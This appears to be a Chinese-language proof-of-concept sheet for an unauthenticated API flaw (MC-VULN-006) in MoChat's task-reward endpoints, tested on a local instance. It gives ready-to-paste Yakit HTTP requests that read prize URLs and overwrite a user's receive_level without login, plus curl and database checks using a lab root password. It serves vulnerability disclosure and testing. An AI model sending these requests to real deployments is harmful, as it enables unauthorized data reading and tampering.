# MC-VULN-006 完整 Yakit PoC（可直接粘贴发包器）

| 项 | 值 |
|----|----|
| 漏洞 | MC-VULN-006 任务宝 H5 接口未鉴权读写 |
| 目标 | `127.0.0.1:9501`（MoChat API） |
| 认证 | **无需登录** |
| 预置数据 | `union_id=union_poc_test`，`fission_id=1` |

用法：Yakit → 发包器 → **整段复制粘贴** → 发送。

---

## PoC-0 环境确认（终端）

```bash
curl -sS 'http://127.0.0.1:9501/operation/workFission/taskData?union_id=union_poc_test&fission_id=1'
```

> **【截图】** 图0 — 环境可达 / API 200  
> ![图0](./MC-VULN-006-00-env.png)

---

## PoC-1 未授权读取任务与奖品 URL

期望：`{"code":200,...}`，`data.task` 含 `gift_url`（如 `http://example.com/prize`）

```http
GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json
Connection: close


```

> **【截图】** 图1 — taskData 未登录返回奖品链接  
> ![图1](./MC-VULN-006-01-taskData.png)

---

## PoC-2 未授权写 receive_level（主漏洞）

期望：`{"code":200,"msg":"","data":[]}`；库中 `receive_level` 变为 `5`

```http
PUT /operation/workFission/receive HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Accept: application/json
Content-Length: 42
Connection: close

{"union_id":"union_poc_test","level":5}
```

> **【截图】** 图2 — receive 返回 code=200  
> ![图2](./MC-VULN-006-02-receive.png)

---

## PoC-3 写库证据（终端 / 客户端）

```bash
docker exec mochat-mysql mysql -uroot -pmochat123 -N mochat \
  -e "SELECT union_id,receive_level FROM mc_work_fission_contact WHERE union_id='union_poc_test';"
# 期望: union_poc_test    5
```

> **【截图】** 图3 — DB receive_level 已更新  
> ![图3](./MC-VULN-006-03-db-receive-level.png)

---

## 判定

| 结果 | 条件 |
|------|------|
| ✅ 未授权读 | taskData 无 Cookie/Token 仍 200 且泄露 gift_url |
| ✅ 未授权写 | receive 无鉴权 code=200 且 DB level 被改 |

截图请放入：`poc/yakit/screenshots/`（文件名见上方）。
